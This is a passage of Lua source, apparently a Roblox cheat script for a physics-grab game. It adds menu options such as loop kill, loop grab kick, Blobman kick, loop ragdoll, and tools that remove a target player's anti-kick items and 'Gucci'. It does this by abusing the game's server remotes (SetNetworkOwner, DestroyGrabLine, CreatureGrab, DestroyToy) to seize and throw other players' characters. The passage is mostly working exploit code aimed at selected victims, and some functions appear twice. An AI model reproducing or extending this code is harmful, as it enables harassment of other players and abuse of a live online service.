        notify(player.Name .. ' is inside a plot.', 2)

        lastPlotWarn = tick()
    end
end
function getname(v)
    if not v then
        return nil
    end

    local startpos = v:find('%(')
    local endpos = v:find('%)')

    if startpos and endpos then
        return v:sub(startpos + 1, endpos - 1)
    end
end
function HasProperty(obj, prop)
    local ok, _ = pcall(function()
        return obj[prop]
    end)

    return ok
end
function saveOriginalPosAttr()
    local char = LocalPlayer.Character
    local hrp = char and char:FindFirstChild('HumanoidRootPart')

    if hrp then
        char:SetAttribute('OriginalPosition', hrp:GetPivot())
    end
end
function getOriginalPosAttr()
    local char = LocalPlayer.Character

    return char and char:GetAttribute('OriginalPosition') or nil
end
function initCharAttrs()
    local char = LocalPlayer.Character

    if char and char:FindFirstChild('HumanoidRootPart') then
        char:SetAttribute('OriginalPosition', char.HumanoidRootPart:GetPivot())
        char:SetAttribute('SavingOriginalPos', false)
    end
end
function scheduleReturnHome()
    local originalPos = getOriginalPosAttr()

    if not originalPos then
        return
    end

    local conn

    conn = RunService.Heartbeat:Connect(function()
        local char = LocalPlayer.Character
        local hrp = char and char:FindFirstChild('HumanoidRootPart')

        if hrp then
            hrp:PivotTo(originalPos)

            if getgenv().originalFallenHeight then
                Workspace.FallenPartsDestroyHeight = getgenv().originalFallenHeight
            end

            char:SetAttribute('SavingOriginalPos', false)
        end

        cameraAnchor:detach()
        conn:Disconnect()
    end)
end
function setNoCollideChar(tChar)
    for _, part in pairs(tChar:GetDescendants())do
        if part:IsA('BasePart') then
            part.CanCollide = false
        end
    end
end

CameraAnchor = {}
CameraAnchor.__index = CameraAnchor

function CameraAnchor.new()
    return setmetatable({}, CameraAnchor)
end
function CameraAnchor:attach(cf)
    self:detach()

    local p = Instance.new('Part')

    p.Name, p.Size, p.Transparency, p.Anchored, p.CanCollide, p.CFrame, p.Parent = 'CameraAnchor', Vector3.new(0.2, 0.2, 0.2), 1, true, false, cf, Workspace
    self.part = p

    local cam = Workspace.CurrentCamera

    cam.CameraType = Enum.CameraType.Custom
    cam.CameraSubject = p
end
function CameraAnchor:detach()
    if self.part then
        self.part:Destroy()

        self.part = nil
    end

    local cam = Workspace.CurrentCamera
    local char = LocalPlayer.Character

    if char and char:FindFirstChild('Humanoid') then
        cam.CameraSubject = char.Humanoid
    else
        cam.CameraType = Enum.CameraType.Custom
        cam.CameraSubject = cam
    end
end

local cameraAnchor = CameraAnchor.new()

function saveOriginalPosAttr()
    local char = LocalPlayer.Character
    local hrp = char and char:FindFirstChild('HumanoidRootPart')

    if hrp then
        char:SetAttribute('OriginalPosition', hrp:GetPivot())
    end
end
function getOriginalPosAttr()
    local char = LocalPlayer.Character

    return char and char:GetAttribute('OriginalPosition') or nil
end
function initCharAttrs()
    local char = LocalPlayer.Character

    if char and char:FindFirstChild('HumanoidRootPart') then
        char:SetAttribute('OriginalPosition', char.HumanoidRootPart:GetPivot())
        char:SetAttribute('SavingOriginalPos', false)
    end
end
function scheduleReturnHome()
    local originalPos = getOriginalPosAttr()

    if not originalPos then
        return
    end

    local conn

    conn = RunService.Heartbeat:Connect(function()
        local char = LocalPlayer.Character
        local hrp = char and char:FindFirstChild('HumanoidRootPart')

        if hrp then
            hrp:PivotTo(originalPos)

            if getgenv().originalFallenHeight then
                Workspace.FallenPartsDestroyHeight = getgenv().originalFallenHeight
            end

            char:SetAttribute('SavingOriginalPos', false)
        end

        cameraAnchor:detach()
        conn:Disconnect()
    end)
end
function modifyTarget(root, hum)
    if not (root and hum) or hum.Health <= 0 then
        return
    end

    local blob = ensureBlobman()

    if blob and blob:FindFirstChild('BlobmanSeatAndOwnerScript') then
        local drop = blob.BlobmanSeatAndOwnerScript:FindFirstChild('CreatureDrop')

        if drop then
            for _, part in ipairs(hum.Parent:GetDescendants())do
                if part:IsA('Weld') or part:IsA('BallSocketConstraint') then
                    drop:FireServer(part, part)
                end
            end
        end
    end

    hum.Sit = false

    hum:ChangeState(Enum.HumanoidStateType.Running)
    hum:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
    hum:ChangeState(Enum.HumanoidStateType.GettingUp)

    local plr = Players:GetPlayerFromCharacter(hum.Parent)

    if plr and plr:FindFirstChild('IsHeld') then
        plr.IsHeld.Value = false
    end

    local rag = hum:FindFirstChild('Ragdolled')

    if rag then
        rag.Value = false
    end

    local bv, bav = Instance.new('BodyVelocity'), Instance.new('BodyAngularVelocity')

    bv.MaxForce = Vector3.new(1e7, -1E7, 1e7)
    bv.P = 100
    bv.Velocity = Vector3.new(math.random(-500, 50), -50, math.random(-50, 50))
    bav.MaxTorque = Vector3.new(-1E7, -1E7, -1E7)
    bav.P = 1e6
    bav.AngularVelocity = Vector3.new(math.random(-500, 300), math.random(-300, 300), math.random(-500, 500))
    bv.Parent, bav.Parent = root, root
    hum.BreakJointsOnDeath = false

    hum:ChangeState(Enum.HumanoidStateType.Dead)

    hum.RigType = Enum.HumanoidRigType.R15

    task.delay(0.08, function()
        if bv.Parent then
            bv:Destroy()
        end
        if bav.Parent then
            bav:Destroy()
        end
    end)
end
function performKill()
    if not SelectedPlayer then
        return
    end

    local target = Players:FindFirstChild(SelectedPlayer)
    local tChar = target and target.Character
    local tRoot = tChar and tChar:FindFirstChild('HumanoidRootPart')
    local tHum = tChar and tChar:FindFirstChild('Humanoid')
    local tHead = tChar and tChar:FindFirstChild('Head')

    if not (target and tRoot and tHum and tHead) then
        return
    end
    if isTooHigh(target) then
        return
    end
    if target:FindFirstChild('InPlot') and target.InPlot.Value then
        return
    end
    if tHum:GetState() == Enum.HumanoidStateType.Dead then
        return
    end

    local char = LocalPlayer.Character
    local hrp = char and char:FindFirstChild('HumanoidRootPart')

    if not (char and hrp) then
        return
    end
    if not char:GetAttribute('SavingOriginalPos') then
        saveOriginalPosAttr()
    end

    char:SetAttribute('SavingOriginalPos', true)

    getgenv().originalFallenHeight = Workspace.FallenPartsDestroyHeight
    Workspace.FallenPartsDestroyHeight = 0 / 0

    local originalPos = getOriginalPosAttr()

    if originalPos then
        cameraAnchor:attach(originalPos)
    end

    local desiredCFrame = CFrame.new(tRoot.Position + TELEPORT_OFFSET)

    hrp:PivotTo(desiredCFrame)
    setNoCollideChar(tChar)
    RemoteSetNetworkOwner:FireServer(tRoot, tRoot.CFrame)
    task.wait()
    RemoteDestroyGrabLine:FireServer(tRoot)
    task.wait()

    if tHead:FindFirstChild('PartOwner') and tHead.PartOwner.Value == LocalPlayer.Name then
        task.wait()
        modifyTarget(tRoot, tHum)
    end

    scheduleReturnHome()
end
function StartLoopKill()
    if KillHB then
        KillHB:Disconnect()
    end

    KillHB = RunService.Heartbeat:Connect(performKill)
end
function StopLoopKill()
    if KillHB then
        KillHB:Disconnect()

        KillHB = nil
    end

    cameraAnchor:detach()
end

selectedNonBlobMode = ''
selectedBlobMode = ''
applyLoopGrabKick = false
blobPlotWarned = false
kickLoopEnabled = false
customKickHeight = 25
loopragdoll = false
spamActive = false
Toggles = Library.Toggles
Options = Library.Options

TgtRight:AddDropdown('NonBlobDropdown', {
    Text = 'Non-Blobman Method',
    Default = '',
    Values = {
        '[OP] Loop Grab Kick',
        '[SILENT] Loop Grab Kick',
    },
    AllowNull = true,
    Callback = function(Value)
        selectedNonBlobMode = Value

        if Toggles.ApplyNonBlob then
            Toggles.ApplyNonBlob:SetValue(false)
        end
        if Toggles.LoopKillToggle then
            Toggles.LoopKillToggle:SetValue(false)
        end
        if Toggles.LGK_Enabled then
            Toggles.LGK_Enabled:SetValue(false)
        end
        if Toggles.LoopGrabKickToggle then
            Toggles.LoopGrabKickToggle:SetValue(false)
        end
    end,
})
TgtMethod:AddCheckbox('ApplyNonBlob', {
    Text = '<b>Apply Non-Blobman Method</b>',
    Tooltip = 'Toggle the selected Non-Blobman method on/off',
    Default = false,
}):OnChanged(function(v)
    if selectedNonBlobMode == '[INSANELY FAST] Loop Kill' then
        if Toggles.LoopKillToggle then
            Toggles.LoopKillToggle:SetValue(v)
        end
    elseif selectedNonBlobMode == '[OP] Loop Grab Kick' then
        if Toggles.LGK_Enabled then
            Toggles.LGK_Enabled:SetValue(v)
        end
    elseif selectedNonBlobMode == '[SILENT] Loop Grab Kick' then
        if Toggles.LoopGrabKickToggle then
            Toggles.LoopGrabKickToggle:SetValue(v)
        end
    else
        if v then
            notify('<b>UNSTABLE</b>', 'Select a Non-Blobman method first!', 3)
            Toggles.ApplyNonBlob:SetValue(false)
        end
    end
end)

local NonBlobActiveBox = TgtRight:AddDependencyGroupbox('Non-Blobman Active')

NonBlobActiveBox:AddCheckbox('LGK_Enabled', {
    Text = '<b>[OP]</b> Loop Grab Kick',
    Tooltip = 'Constantly grabs the selected player and loop kicks them.',
    Default = false,
}):OnChanged(function(v)
    if not v and Toggles.ApplyNonBlob and Toggles.ApplyNonBlob.Value then
        Toggles.ApplyNonBlob:SetValue(false)
    end
end)
NonBlobActiveBox:AddCheckbox('LoopGrabKickToggle', {
    Text = '<b>[SILENT]</b> Loop Grab Kick',
    Tooltip = 'VERY buggy, silently kicks the user',
    Default = false,
}):OnChanged(function(v)
    if not v and Toggles.ApplyNonBlob and Toggles.ApplyNonBlob.Value then
        Toggles.ApplyNonBlob:SetValue(false)
    end
end)
NonBlobActiveBox:SetupDependencies({
    {
        Options.NonBlobDropdown,
        '[INSANELY FAST] Loop Kill',
        Toggles.LoopKillToggle,
    },
    {
        Options.NonBlobDropdown,
        '[FAST - OP] Loop Grab Kick',
        Toggles.LGK_Enabled,
    },
    {
        Options.NonBlobDropdown,
        '[SILENT] Loop Grab Kick',
        Toggles.LoopGrabKickToggle,
    },
})

local LGKBox = TgtRight:AddDependencyGroupbox('Loop Grab Kick Settings')

LGKBox:AddSlider('LGK_SliderX', {
    Text = 'Grab Offset X',
    Min = -20,
    Max = 20,
    Default = 0,
    Rounding = 1,
})
LGKBox:AddSlider('LGK_SliderY', {
    Text = 'Grab Offset Y',
    Min = -20,
    Max = 20,
    Default = 5,
    Rounding = 1,
})
LGKBox:AddSlider('LGK_SliderZ', {
    Text = 'Grab Offset Z',
    Min = -20,
    Max = 20,
    Default = 0,
    Rounding = 1,
})

Players = game:GetService('Players')
Workspace = game:GetService('Workspace')
ReplicatedStorage = game:GetService('ReplicatedStorage')
LocalPlayer = Players.LocalPlayer
antiAntiKickActive = false
recentParts = {}
CONFIG = {
    AURA_RADIUS = 50,
    SCAN_DELAY = 0.05,
}
ToyTypes = {
    NinjaKunai = true,
    NinjaShuriken = true,
    AntiKick = true,
    ToolCleaver = true,
    ToolDiggingForkRusty = true,
    ToolPencil = true,
}

LGKBox:AddCheckbox('AntiAntiKickToggle', {
    Text = '<b>[AURA]</b> Remove Target Stickys',
    Tooltip = 'Removes your targets anti kick',
    Default = false,
})
Toggles.AntiAntiKickToggle:OnChanged(function(Value)
    antiAntiKickActive = Value

    if Value then
        task.spawn(function()
            while antiAntiKickActive do
                local char = LocalPlayer.Character

                if char and char.PrimaryPart then
                    local parts = Workspace:GetPartBoundsInRadius(char.PrimaryPart.Position, CONFIG.AURA_RADIUS)

                    for _, part in ipairs(parts)do
                        if part:IsA('BasePart') then
                            local model = part:FindFirstAncestorWhichIsA('Model')

                            if model and ToyTypes[model.Name] then
                                local folder = model.Parent

                                if folder and string.find(folder.Name, 'SpawnedInToys') and not string.find(folder.Name, LocalPlayer.Name) then
                                    local stickyPart = model:FindFirstChild('StickyPart')

                                    if stickyPart then
                                        pcall(function()
                                            local SetNetOwner = ReplicatedStorage.GrabEvents.SetNetworkOwner

                                            SetNetOwner:FireServer(stickyPart, stickyPart.CFrame)

                                            if stickyPart:FindFirstChild('PartOwner') and stickyPart.PartOwner.Value == LocalPlayer.Name then
                                                stickyPart.CFrame = CFrame.new(0, 1000, 0)
                                            end
                                        end)
                                    end
                                end
                            end
                        end
                    end
                end

                task.wait(CONFIG.SCAN_DELAY)
            end
        end)
    else
        antiAntiKickActive = false
    end
end)
LGKBox:AddCheckbox('LoopRagdoll', {
    Text = '<b>[LOOP]</b> Ragdoll Target',
    Tooltip = 'Loop ragdolls the selected target using a pallet.',
    Default = false,
    Callback = function(enabled)
        loopragdoll = enabled

        if enabled then
            function spawnragdoll()
                PalletForRagdoll = spawntoy('PalletLightBrown', HRP.CFrame * CFrame.new(0, 10, 20))

                repeat
                    task.wait()
                until PalletForRagdoll and PalletForRagdoll:FindFirstChild('SoundPart')
                repeat
                    task.wait()
                    sno(PalletForRagdoll.SoundPart)
                until PalletForRagdoll.SoundPart:FindFirstChild('PartOwner')

                PalletForRagdoll.SoundPart.AssemblyLinearVelocity = Vector3.new(0, 1e9, 0)

                for _, v in pairs(PalletForRagdoll:GetChildren())do
                    if v:IsA('Part') then
                        v.CanCollide = false
                        v.CanQuery = false
                        v.Transparency = 1
                    end
                end

                PalletForRagdoll.Name = 'PalletForRagdoll'
                cons.PalletDestroying = PalletForRagdoll.Destroying:Once(function()
                    spawnragdoll()
                end)
            end

            spawnragdoll()
            task.spawn(function()
                while loopragdoll and task.wait(0.05) do
                    if Sets.Char and Sets.Char.Humanoid and Sets.Char.Humanoid.Ragdolled and not Sets.Char.Humanoid.Ragdolled.Value and PalletForRagdoll and PalletForRagdoll:FindFirstChild('SoundPart') then
                        PalletForRagdoll.SoundPart.AssemblyLinearVelocity = Vector3.new(0, 1000, 0)
                        PalletForRagdoll.SoundPart.CFrame = Sets.Char.HumanoidRootPart.CFrame

                        task.wait(0.05)

                        PalletForRagdoll.SoundPart.CFrame = CFrame.new(0, 1e9, 0)
                    end
                end
            end)
        else
            if cons.PalletDestroying then
                cons.PalletDestroying:Disconnect()

                cons.PalletDestroying = nil
            end
            if inv:FindFirstChild('PalletForRagdoll') then
                DestroyToy:FireServer(inv.PalletForRagdoll)
            end
        end
    end,
})

offset = CFrame.new(0, 15, 0)

local PalletForRagdoll

Seats = {}
applymethodblob = false
applymethodgrab = false
BlobmanSets = {
    Name = nil,
    Char = nil,
    HRP = nil,
    Method = nil,
}
GrabSets = {
    Name = nil,
    Char = nil,
    HRP = nil,
    Method = nil,
}

local DestroyTargetGucciActive = false

LGKBox:AddCheckbox('DestroyTargetGucci', {
    Text = '<b>[SIT]</b> Remove target Gucci',
    Tooltip = "Sits on the target's Blobman when spawned, then removes its Gucci",
    Default = false,
    Callback = function(Value)
        DestroyTargetGucciActive = Value

        if Value then
            local target = getSelectedPlayer()

            if not target then
                notify('<b>UNSTABLE</b>', 'Select A target first', 3)
                Toggles.DestroyTargetGucci:SetValue(false)

                return
            end

            local char = Player.Character
            local root = char and char:FindFirstChild('HumanoidRootPart')

            if not root then
                return
            end

            local SafeSpot = root.CFrame
            local RunService = game:GetService('RunService')
            local folderName = target.Name .. 'SpawnedInToys'

            notify('<b>UNSTABLE</b>', 'Watching: ' .. folderName, 3)
            task.spawn(function()
                while DestroyTargetGucciActive do
                    target = getSelectedPlayer()

                    if not target or not target.Parent then
                        DestroyTargetGucciActive = false

                        Toggles.DestroyTargetGucci:SetValue(false)

                        break
                    end

                    local toysFolder = workspace:FindFirstChild(folderName)

                    if not toysFolder then
                        task.wait(1)
                    else
                        for _, obj in ipairs(toysFolder:GetChildren())do
                            if not DestroyTargetGucciActive then
                                break
                            end
                            if obj.Name == 'CreatureBlobman' then
                                local seat = obj:FindFirstChild('VehicleSeat') or obj:FindFirstChildWhichIsA('VehicleSeat', true)

                                if seat then
                                    local myChar = Player.Character
                                    local myRoot = myChar and myChar:FindFirstChild('HumanoidRootPart')
                                    local myHum = myChar and myChar:FindFirstChild('Humanoid')

                                    if myRoot and myHum then
                                        if myHum.SeatPart ~= seat then
                                            notify('<b>UNSTABLE</b>', 'Sitting on the targets Blobman', 1)

                                            local magnetConn

                                            magnetConn = RunService.Stepped:Connect(function()
                                                if myRoot and seat then
                                                    myRoot.CFrame = seat.CFrame
                                                    myRoot.Velocity = Vector3.zero

                                                    if obj.PrimaryPart then
                                                        obj.PrimaryPart.Velocity = Vector3.zero
                                                        obj.PrimaryPart.RotVelocity = Vector3.zero
                                                    end
                                                end
                                            end)

                                            local sitStart = tick()

                                            while tick() - sitStart < 1 do
                                                if not DestroyTargetGucciActive then
                                                    break
                                                end
                                                if myHum.SeatPart == seat then
                                                    break
                                                end

                                                seat:Sit(myHum)
                                                task.wait()
                                            end

                                            if magnetConn then
                                                magnetConn:Disconnect()
                                            end
                                            if myHum.SeatPart == seat then
                                                task.wait(0.3)

                                                myHum.Sit = false
                                                myHum.Jump = true

                                                task.wait(0.05)

                                                myRoot.CFrame = SafeSpot
                                                myRoot.Velocity = Vector3.zero

                                                notify('<b>UNSTABLE</b>', 'Target Gucci Removed!', 1)
                                                task.wait(0.5)
                                            else
                                                myRoot.CFrame = SafeSpot
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end

                    task.wait(1)
                end
            end)
        else
            DestroyTargetGucciActive = false

            notify('<b>UNSTABLE</b>', 'Auto Destory Gucci OFF', 2)
        end
    end,
})
LGKBox:SetupDependencies({
    {
        Options.NonBlobDropdown,
        '[OP] Loop Grab Kick',
    },
})
TgtRight:AddDropdown('BlobDropdown', {
    Text = 'Blobman Method',
    Default = '',
    Values = {
        '[NETOWN] Spam Kick',
        '[GRAB & BLOB] Loop Kick',
        '[BLOBMAN] Loop kill',
        '[BLOB] Quick Kick',
        '[BLIZT] Blobman Kick',
    },
    AllowNull = true,
    Callback = function(Value)
        selectedBlobMode = Value

        if Toggles.ApplyBlob then
            Toggles.ApplyBlob:SetValue(false)
        end
        if Toggles.SpamKickToggle then
            Toggles.SpamKickToggle:SetValue(false)
        end
        if Toggles.XOCUBlobKickToggle then
            Toggles.XOCUBlobKickToggle:SetValue(false)
        end
        if KickQuickToggle then
            KickQuickToggle:SetValue(false)
        end
        if Toggles.BlobLoopKick then
            Toggles.BlobLoopKick:SetValue(false)
        end
        if Toggles.blobkicktoggle then
            Toggles.blobkicktoggle:SetValue(false)
        end
    end,
})
TgtMethod:AddCheckbox('ApplyBlob', {
    Text = '<b>Apply Blobman Method</b>',
    Tooltip = 'Toggle the selected Blobman method on/off',
    Default = false,
}):OnChanged(function(v)
    if selectedBlobMode == '[NETOWN] Spam Kick' then
        if Toggles.SpamKickToggle then
            Toggles.SpamKickToggle:SetValue(v)
        end
    elseif selectedBlobMode == '[GRAB & BLOB] Loop Kick' then
        if Toggles.XOCUBlobKickToggle then
            Toggles.XOCUBlobKickToggle:SetValue(v)
        end
    elseif selectedBlobMode == '[BLOBMAN] Loop kill' then
        if Toggles.BlobLoopKill then
            Toggles.BlobLoopKill:SetValue(v)
        end
    elseif selectedBlobMode == '[BLOB] Quick Kick' then
        if KickQuickToggle then
            KickQuickToggle:SetValue(v)
        end
    elseif selectedBlobMode == '[BLIZT] Blobman Kick' then
        if Toggles.blobkicktoggle then
            Toggles.blobkicktoggle:SetValue(v)
        end
    else
        if v then
            notify('<b>UNSTABLE</b>', 'Select a Blobman method first!', 3)
            Toggles.ApplyBlob:SetValue(false)
        end
    end
end)

local BlobActiveBox = TgtRight:AddDependencyGroupbox('Blobman Active')
local pBLK = BlobActiveBox:AddCheckbox('BlobLoopKill', {
    Text = '<b>[BLOBMAN]</b> Loop kill',
    Tooltip = 'Fastest blobkill that goes UNDERGROUND instead of ontop of the surface.',
    Default = false,
})

pBLK:OnChanged(function(state)
    for _, username in ipairs(_selectedPlayers)do
        local p = Players:FindFirstChild(username)

        if p then
            if state then
                BlobKillList[p.UserId] = 'jizzybrizzy'
                BlobkickList[p.UserId] = nil

                Toggles.BlobLoopKick:SetValue(false)
            else
                BlobKillList[p.UserId] = nil
            end
        end
    end
end)

kickGrabActive = false
kickQuickActive = false
kickGrabDelay = 0.2
kickFlySpeed = 75
kickMaxDistance = 10
kickNotifyEnabled = true
kickTargetList = {}
kickCurrentTargetIdx = 1
kickRS = game:GetService('ReplicatedStorage')
kickSetNetworkOwner = kickRS:WaitForChild('GrabEvents'):WaitForChild('SetNetworkOwner')
kickDestroyGrabLine = kickRS:WaitForChild('GrabEvents'):WaitForChild('DestroyGrabLine')
kickSpawnToyRemoteFunction = kickRS:WaitForChild('MenuToys'):WaitForChild('SpawnToyRemoteFunction')
kickDestroyToy = kickRS:WaitForChild('MenuToys'):WaitForChild('DestroyToy')

function kickNotify(title, desc, t)
    if kickNotifyEnabled then
        Library:Notify({
            Title = title,
            Description = desc,
            Time = t or 3,
        })
    end
end
function buildKickTargetList()
    local p = getSelectedPlayer()

    if p then
        return {p}
    end

    return {}
end
function getNextKickTarget()
    kickTargetList = buildKickTargetList()

    if #kickTargetList == 0 then
        return nil
    end
    if kickCurrentTargetIdx > #kickTargetList then
        kickCurrentTargetIdx = 1
    end

    local target = kickTargetList[kickCurrentTargetIdx]

    kickCurrentTargetIdx += 1

    return target
end
function spawnKickBlobman()
    local char = LocalPlayer.Character

    if not char or not char:FindFirstChild('HumanoidRootPart') then
        return nil
    end

    kickSpawnToyRemoteFunction:InvokeServer('CreatureBlobman', char.HumanoidRootPart.CFrame * CFrame.new(0, 5, 0), Vector3.new(0, 0, 0))
    task.wait(0)

    local toysFolder = workspace:FindFirstChild(LocalPlayer.Name .. 'SpawnedInToys')

    if toysFolder then
        local b = toysFolder:FindFirstChild('CreatureBlobman')

        if b and b:IsA('Model') then
            return b
        end
    end

    return nil
end
function sitOnKickBlobman(blobman)
    if not blobman or not blobman:IsA('Model') then
        return false
    end

    local seat = blobman:FindFirstChild('VehicleSeat')

    if not seat then
        return false
    end

    local char = LocalPlayer.Character

    if not char then
        return false
    end

    local humanoid = char:FindFirstChild('Humanoid')

    if humanoid then
        seat:Sit(humanoid)
        task.wait(0)

        return true
    end

    return false
end
function findMountedKickBlobman()
    for _, obj in pairs(workspace:GetDescendants())do
        if obj:IsA('Model') and obj.Name == 'CreatureBlobman' then
            if obj:FindFirstChild('VehicleSeat') and obj.VehicleSeat:FindFirstChild('SeatWeld') then
                local wp = obj.VehicleSeat.SeatWeld.Part1

                if wp and wp.Parent == LocalPlayer.Character then
                    return obj
                end
            end
        end
    end

    return nil
end
function teleportToKick(target)
    local char = LocalPlayer.Character

    if char and char:FindFirstChild('HumanoidRootPart') and target and target.Character and target.Character:FindFirstChild('HumanoidRootPart') then
        char.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -3)
    end
end
function isNearKickTarget(target)
    local myChar = LocalPlayer.Character

    if not myChar or not myChar:FindFirstChild('HumanoidRootPart') then
        return false
    end
    if not target or not target.Character or not target.Character:FindFirstChild('HumanoidRootPart') then
        return false
    end

    return (myChar.HumanoidRootPart.Position - target.Character.HumanoidRootPart.Position).Magnitude <= kickMaxDistance
end
function performBlobKick(blobman, target)
    local targetHRP = target.Character and target.Character:FindFirstChild('HumanoidRootPart')

    if not targetHRP then
        kickNotify('Blob Kick', 'Target has no HumanoidRootPart', 3)

        return false
    end

    teleportToKick(target)
    task.wait(0.3)

    if not isNearKickTarget(target) then
        return false
    end

    kickSetNetworkOwner:FireServer(targetHRP, targetHRP.CFrame)
    kickDestroyGrabLine:FireServer(targetHRP)
    task.wait(0.3)

    local bp = Instance.new('BodyPosition')

    bp.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    bp.D = 200
    bp.P = kickFlySpeed * 1000
    bp.Position = targetHRP.Position + Vector3.new(0, 20, 0)
    bp.Parent = targetHRP

    task.wait(0.3)
    bp:Destroy()

    local ld = blobman:FindFirstChild('LeftDetector')

    if ld and ld:FindFirstChild('LeftWeld') and blobman:FindFirstChild('BlobmanSeatAndOwnerScript') then
        local ge = blobman.BlobmanSeatAndOwnerScript:FindFirstChild('CreatureGrab')

        if ge then
            ge:FireServer(ld, targetHRP, ld.LeftWeld)
        end
    end

    kickTimerStartTime = tick()
    kickTimerActive = true

    kickDestroyToy:FireServer(blobman)

    return true
end
function startAutoKickGrab()
    kickGrabActive = true
    kickCurrentTargetIdx = 1

    local hasSetupBlobman = false

    kickTargetList = buildKickTargetList()

    if #kickTargetList == 0 then
        kickGrabActive = false

        if KickAutoGrabToggle then
            KickAutoGrabToggle:SetValue(false)
        end

        return
    end

    while kickGrabActive do
        kickTargetList = buildKickTargetList()

        if #kickTargetList == 0 then
            kickGrabActive = false

            if KickAutoGrabToggle then
                KickAutoGrabToggle:SetValue(false)
            end

            break
        end

        local blobman = findMountedKickBlobman()

        if not blobman and not hasSetupBlobman then
            blobman = spawnKickBlobman()

            if blobman then
                if sitOnKickBlobman(blobman) then
                    hasSetupBlobman = true
                else
                    kickGrabActive = false

                    if KickAutoGrabToggle then
                        KickAutoGrabToggle:SetValue(false)
                    end

                    break
                end
            else
                kickGrabActive = false

                if KickAutoGrabToggle then
                    KickAutoGrabToggle:SetValue(false)
                end

                break
            end
        end
        if blobman and hasSetupBlobman then
            local target = getNextKickTarget()

            if target then
                performBlobKick(blobman, target)

                if kickCurrentTargetIdx > #kickTargetList then
                    kickGrabActive = false

                    if KickAutoGrabToggle then
                        KickAutoGrabToggle:SetValue(false)
                    end

                    break
                end
            end
        end

        task.wait(kickGrabDelay)
    end
end
function quickKickSelectedPlayer()
    kickQuickActive = true
    kickCurrentTargetIdx = 1
    kickTargetList = buildKickTargetList()

    if #kickTargetList == 0 then
        kickQuickActive = false

        if KickQuickToggle then
            KickQuickToggle:SetValue(false)
        end

        return
    end

    while kickQuickActive do
        local blobman = findMountedKickBlobman()

        if not blobman then
            kickQuickActive = false

            if KickQuickToggle then
                KickQuickToggle:SetValue(false)
            end

            break
        end

        kickTargetList = buildKickTargetList()

        if #kickTargetList == 0 then
            kickQuickActive = false

            if KickQuickToggle then
                KickQuickToggle:SetValue(false)
            end

            break
        end

        local target = getNextKickTarget()

        if target then
            performBlobKick(blobman, target)

            if kickCurrentTargetIdx > #kickTargetList then
                kickQuickActive = false

                if KickQuickToggle then
                    KickQuickToggle:SetValue(false)
                end

                break
            end
        end

        task.wait(kickGrabDelay)
    end
end

KickQuickToggle = BlobActiveBox:AddCheckbox('QuickKick', {
    Text = '<b>[BLOB]</b> Quick Kick',
    Tooltip = '<b>[SIT ON BLOBMAN FIRST]</b> Kicks the selected target with a blobman',
    Default = false,
})

KickQuickToggle:OnChanged(function(v)
    kickQuickActive = v

    if v then
        task.spawn(quickKickSelectedPlayer)
    end
end)
BlobActiveBox:AddCheckbox('blobkicktoggle', {
    Text = '<b>[BLIZT]</b> Blobman Kick',
    Tooltip = 'Single-shot kick using the Blitz method',
    Default = false,
}):OnChanged(function(enabled)
    LoopBlobKickOn = enabled

    local respawnConn = nil

    function findMountedBlob()
        local c = LocalPlayer.Character
        local h2 = c and c:FindFirstChild('Humanoid')
        local seat = h2 and h2.SeatPart

        return (seat and seat.Parent and seat.Parent.Name == 'CreatureBlobman') and seat.Parent or nil
    end
    function bringRightArm(targetName, b)
        if not LoopBlobKickOn or not b then
            return
        end

        local tp2 = Players:FindFirstChild(targetName)
        local c2 = tp2 and tp2.Character
        local hrp2 = c2 and c2:FindFirstChild('HumanoidRootPart')
        local rd = b:FindFirstChild('RightDetector')
        local weld2 = rd and rd:FindFirstChild('RightWeld')
        local script2 = b:FindFirstChild('BlobmanSeatAndOwnerScript')
        local grab2 = script2 and script2:FindFirstChild('CreatureGrab')

        if hrp2 and grab2 and weld2 then
            grab2:FireServer(Players.LocalPlayer, hrp2, weld2)
        end
    end
    function execBlobKick(targetName)
        if not LoopBlobKickOn then
            return
        end

        local c = LocalPlayer.Character
        local h2 = c and c:FindFirstChild('Humanoid')
        local hrp2 = c and c:FindFirstChild('HumanoidRootPart')

        if not (h2 and hrp2) then
            return
        end

        local b = findMountedBlob() or ensureBlobman()

        if not b or not LoopBlobKickOn then
            return
        end

        task.wait(0.1)

        local seat = b:FindFirstChild('VehicleSeat')

        if seat and h2.SeatPart ~= seat then
            seat:Sit(h2)
            task.wait(0.1)
        end
        if not LoopBlobKickOn then
            return
        end

        local tp2 = Players:FindFirstChild(targetName)
        local tChr = tp2 and tp2.Character
        local tHRP = tChr and tChr:FindFirstChild('HumanoidRootPart')

        if not tHRP then
            return
        end

        local startSelf = hrp2.CFrame
        local startBlob = b.PrimaryPart and b.PrimaryPart.CFrame
        local oldCF = tHRP.CFrame

        hrp2.CFrame = oldCF

        task.wait(0.1)

        for _ = 1, 15 do
            if not LoopBlobKickOn then
                return
            end

            RemoteSetNetworkOwner:FireServer(tHRP, tHRP.CFrame)

            tHRP.CFrame = oldCF * CFrame.new(0, 40, 0)

            task.wait()
        end

        RemoteDestroyGrabLine:FireServer(tHRP)
        task.wait(0.1)
        bringRightArm(targetName, b)
        bringRightArm(targetName, b)
        bringRightArm(targetName, b)
        task.delay(0.8, function()
            if not LoopBlobKickOn then
                return
            end
            if hrp2 then
                hrp2.CFrame = startSelf
            end
            if b and b.PrimaryPart and startBlob then
                b:SetPrimaryPartCFrame(startBlob)
            end
        end)
    end

    if enabled then
        if SelectedPlayer and SelectedPlayer ~= '' then
            execBlobKick(SelectedPlayer)

            local tp2 = Players:FindFirstChild(SelectedPlayer)

            if tp2 then
                if respawnConn then
                    respawnConn:Disconnect()
                end

                respawnConn = tp2.CharacterAdded:Connect(function()
                    if LoopBlobKickOn then
                        task.wait(1)
                        execBlobKick(SelectedPlayer)
                    end
                end)
            end
        end
    else
        LoopBlobKickOn = false

        if respawnConn then
            respawnConn:Disconnect()

            respawnConn = nil
        end
    end
end)
BlobActiveBox:AddCheckbox('XOCUBlobKickToggle', {
    Text = '<b>[GRAB & BLOB]</b> Loop Kick',
    Tooltip = 'Uses a blobman to Grab & Release the target, kicking them. Toggle off/on if target moves.',
    Default = false,
    Callback = function(on)
        kickLoopEnabled = on
        loopKickDualActive = on

        if not on and Toggles.ApplyBlob and Toggles.ApplyBlob.Value then
            Toggles.ApplyBlob:SetValue(false)
        end
        if on then
            local target = getSelectedPlayer()

            if not target then
